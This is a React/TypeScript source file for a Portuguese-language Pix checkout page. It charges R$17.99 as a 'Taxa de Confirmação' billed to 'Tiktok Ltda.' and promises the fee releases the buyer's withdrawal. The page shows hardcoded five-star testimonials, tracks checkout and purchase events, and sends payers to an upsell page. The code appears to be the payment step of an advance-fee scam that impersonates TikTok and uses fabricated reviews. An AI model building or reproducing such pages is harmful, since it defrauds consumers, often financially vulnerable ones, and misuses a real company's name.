import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { QRCodeCanvas } from "qrcode.react";
import { useServerFn } from "@tanstack/react-start";
import { trackEvent } from "@/lib/tracking";
import { createPixPayment, getPixStatus } from "@/lib/pix.functions";


export const Route = createFileRoute("/checkout")({
  head: () => ({
    meta: [
      { title: "Taxa de Confirmação | Checkout" },
      {
        name: "description",
        content: "Finalize o pagamento da taxa de confirmação via Pix e libere seu saque.",
      },
      { property: "og:title", content: "Taxa de Confirmação | Checkout" },
      { property: "og:description", content: "Pagamento via Pix com aprovação imediata." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Checkout,
});

const TOTAL = 17.99;
const PRODUCT_IMG =
  "https://d1frh8xn9wll8b.cloudfront.net/products-images/1761504614229-1761455352001-9fb940dc-0829-469b-9ee6-9b507bbe2477.webp";
const BANNER_IMG =
  "https://d1frh8xn9wll8b.cloudfront.net/1785767423034-Captura-de-Tela-2026-08-03-a%C3%8C%C2%80s-11.27.33.webp";

const REVIEWS = [
  {
    name: "Lucas Almeida",
    text: "Familia, testado e aprovado, funciona MUITOOOO",
    img: "https://d1frh8xn9wll8b.cloudfront.net/reviews/1761510377629-1756656398008-1756591742828-photo_2025-08-30_18-12-16.webp",
  },
  {
    name: "Larissa bjus",
    text: "Graças ao ttk, vou conseguir pagar a mensalidade da faculdade que está atrasada",
    img: "https://d1frh8xn9wll8b.cloudfront.net/reviews/1761510417563-1756656365145-1756588901009-photo_2025-08-30_18-12-20.webp",
  },
  {
    name: "Caio Lacerda",
    text: "muito bom, lancei até a nave nova kkkk",
    img: "https://d1frh8xn9wll8b.cloudfront.net/reviews/1761510275333-1756656283889-1756588828370-photo_2025-08-30_18-12-16.webp",
  },
  {
    name: "Ana Camargo",
    text: "Genteeee, estou sem acreditar até agr kkkkk",
    img: "https://d1frh8xn9wll8b.cloudfront.net/reviews/1761510331478-1756656326432-1756588864250-photo_2025-08-30_18-12-28.webp",
  },
];

const brl = (v: number) =>
  v.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

function Reviews() {
  const items = [...REVIEWS, ...REVIEWS];
  return (
    <div className="overflow-hidden rounded-xl bg-white p-4 shadow-sm">
      <div className="flex w-max gap-3 animate-[reviews-scroll_28s_linear_infinite] hover:[animation-play-state:paused]">
        {items.map((r, i) => (
          <div
            key={`${r.name}-${i}`}
            className="flex w-64 shrink-0 flex-col gap-2 rounded-xl border border-[#D6DEE8] p-3"
          >
            <div className="flex items-center gap-2">
              <img
                src={r.img}
                alt={`Foto de ${r.name}`}
                className="h-10 w-10 rounded-full object-cover"
                loading="lazy"
              />
              <div>
                <p className="text-sm font-semibold text-black">{r.name}</p>
                <p className="text-xs text-[#FBBF24]">★★★★★</p>
              </div>
            </div>
            <p className="text-sm text-[#607089]">"{r.text}"</p>
          </div>
        ))}
      </div>
    </div>
  );
}


function Summary() {
  return (
    <div className="rounded-xl bg-white p-6 shadow-sm">
      <ul className="flex flex-col gap-y-4">
        <li className="flex items-center gap-x-3 border-b border-[#D6DEE8] pb-4">
          <div className="relative h-20 w-20 shrink-0 overflow-hidden rounded-xl border border-[#D6DEE8]">
            <img
              src={PRODUCT_IMG}
              alt="Taxa de Confirmação"
              className="h-full w-full object-cover"
              loading="lazy"
            />
          </div>
          <div className="min-w-0">
            <p className="truncate font-semibold text-black">Taxa de Confirmação</p>
            <p className="text-sm text-[#607089]">Tiktok Ltda.</p>
          </div>
          <span className="ml-auto font-semibold text-black">{brl(TOTAL)}</span>
        </li>
      </ul>
      <div className="mt-4 flex items-center justify-between">
        <span className="text-base font-medium text-[#607089]">Total</span>
        <span className="text-xl font-bold text-black">{brl(TOTAL)}</span>
      </div>
    </div>
  );
}

type Pix = { id: string; qrCode: string; qrCodeUrl: string | null };

function Checkout() {
  const navigate = useNavigate();
  const createPix = useServerFn(createPixPayment);
  const checkStatus = useServerFn(getPixStatus);

  const [email, setEmail] = useState("");
  const [name, setName] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [pix, setPix] = useState<Pix | null>(null);
  const [copied, setCopied] = useState(false);
  const paidRef = useRef(false);

  useEffect(() => {
    trackEvent("InitiateCheckout", {
      content_name: "Taxa de Confirmação",
      currency: "BRL",
      value: TOTAL,
    });
  }, []);

  useEffect(() => {
    if (!pix?.id) return;
    let timer: ReturnType<typeof setInterval>;
    const tick = async () => {
      try {
        const res = await checkStatus({ data: { id: pix.id } });
        if (res.status?.toUpperCase() === "PAID" && !paidRef.current) {
          paidRef.current = true;
          clearInterval(timer);
          trackEvent("Purchase", { currency: "BRL", value: TOTAL });
          navigate({ to: "/upsell-1" });
        }
      } catch {
        /* tenta de novo no próximo ciclo */
      }
    };
    void tick();
    timer = setInterval(tick, 1500);
    return () => clearInterval(timer);
  }, [pix?.id, checkStatus, navigate]);

  const onSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    try {
      const res = await createPix({
        data: {
          amount: TOTAL,
          title: "Taxa de Confirmação",
          name,
          email,
        },
      });
      setPix({ id: res.id, qrCode: res.qrCode, qrCodeUrl: res.qrCodeUrl });
    } catch (err) {
      setError(
        err instanceof Error ? err.message : "Não foi possível gerar o Pix. Tente novamente.",
      );
    } finally {
      setLoading(false);
    }
  };

  const copy = async () => {
    if (!pix) return;
    await navigator.clipboard.writeText(pix.qrCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-[#F3F6FB] text-black">
      <div className="bg-[#ff0150] p-4 text-center text-lg font-medium text-white">
        PAGAMENTO 100% SEGURO
      </div>

      <main className="flex min-h-screen flex-col lg:flex-row">
        <div className="lg:flex lg:w-[60%] lg:flex-col lg:justify-center lg:border-r lg:border-[#D6DEE8]">
          <img src={BANNER_IMG} alt="Banner da loja" className="w-full object-cover lg:hidden" />
          <div className="mx-auto hidden w-full max-w-md space-y-4 px-6 py-10 lg:block">
            <Summary />
            <Reviews />
          </div>

        </div>

        <div className="w-full px-4 py-6 lg:w-[40%] lg:px-10 lg:py-10">
          <div className="mx-auto w-full max-w-md space-y-6">
            {pix ? (
              <div className="rounded-xl bg-white p-6 text-center shadow-sm">
                <h2 className="text-lg font-semibold">Escaneie o QR Code para pagar</h2>
                <p className="mt-1 text-sm text-[#607089]">
                  Valor: <strong>{brl(TOTAL)}</strong>
                </p>
                <div className="mt-5 flex justify-center">
                  <div className="rounded-xl border border-[#D6DEE8] bg-white p-3">
                    <QRCodeCanvas value={pix.qrCode} size={220} />
                  </div>
                </div>
                <p className="mt-5 text-sm font-medium">Ou copie o código Pix:</p>
                <p className="mt-2 break-all rounded-[0.625rem] border border-[#D6DEE8] bg-[#F3F6FB] p-3 text-xs text-[#607089]">
                  {pix.qrCode}
                </p>
                <button
                  type="button"
                  onClick={copy}
                  className="mt-4 w-full rounded-[0.625rem] bg-[#ff0150] px-4 py-4 text-lg font-bold text-white transition-opacity hover:opacity-90"
                >
                  {copied ? "Código copiado!" : "Copiar código Pix"}
                </button>
                <p className="mt-4 text-sm text-[#607089]">
                  Assim que o pagamento for confirmado, você avança automaticamente.
                </p>
              </div>
            ) : (
              <form onSubmit={onSubmit} className="rounded-xl bg-white p-6 shadow-sm">
                <h2 className="text-lg font-semibold">Identificação</h2>
                <div className="mt-4 space-y-3">
                  <input
                    type="email"
                    required
                    placeholder="Email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full rounded-[0.625rem] border border-[#D6DEE8] bg-white px-4 py-3 text-black placeholder:text-[#8A97AB] focus:border-[#ff0150] focus:outline-none"
                  />
                  <input
                    type="text"
                    required
                    placeholder="Nome e sobrenome"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    className="w-full rounded-[0.625rem] border border-[#D6DEE8] bg-white px-4 py-3 text-black placeholder:text-[#8A97AB] focus:border-[#ff0150] focus:outline-none"
                  />
                </div>

                <h2 className="mt-6 text-lg font-semibold">Escolha um método de pagamento...</h2>
                <div className="mt-3 flex items-center gap-3 rounded-[0.625rem] border-2 border-[#ff0150] bg-[#EEF3FA] px-4 py-3">
                  <span className="flex h-5 w-5 items-center justify-center rounded-full border-2 border-[#ff0150]">
                    <span className="h-2.5 w-2.5 rounded-full bg-[#ff0150]" />
                  </span>
                  <span className="font-medium">Pagamento via Pix</span>
                  <span className="ml-auto text-sm text-[#16A34A]">Aprovação imediata.</span>
                </div>

                <div className="mt-6 space-y-4 lg:hidden">
                  <Summary />
                  <Reviews />
                </div>


                {error && (
                  <p className="mt-4 rounded-[0.625rem] bg-[#FEE2E2] p-3 text-sm text-[#B91C1C]">
                    {error}
                  </p>
                )}

                <button
                  type="submit"
                  disabled={loading}
                  className="mt-6 w-full rounded-[0.625rem] bg-[#ff0150] px-4 py-4 text-lg font-bold text-white transition-opacity hover:opacity-90 disabled:opacity-70"
                >
                  {loading ? "Gerando Pix..." : "Pagar"}
                </button>

                <p className="mt-4 text-center text-xs text-[#607089]">
                  Ao finalizar o pagamento você concorda com nossos termos de uso e privacidade.
                </p>
              </form>
            )}
          </div>
        </div>
      </main>
    </div>
  );
}

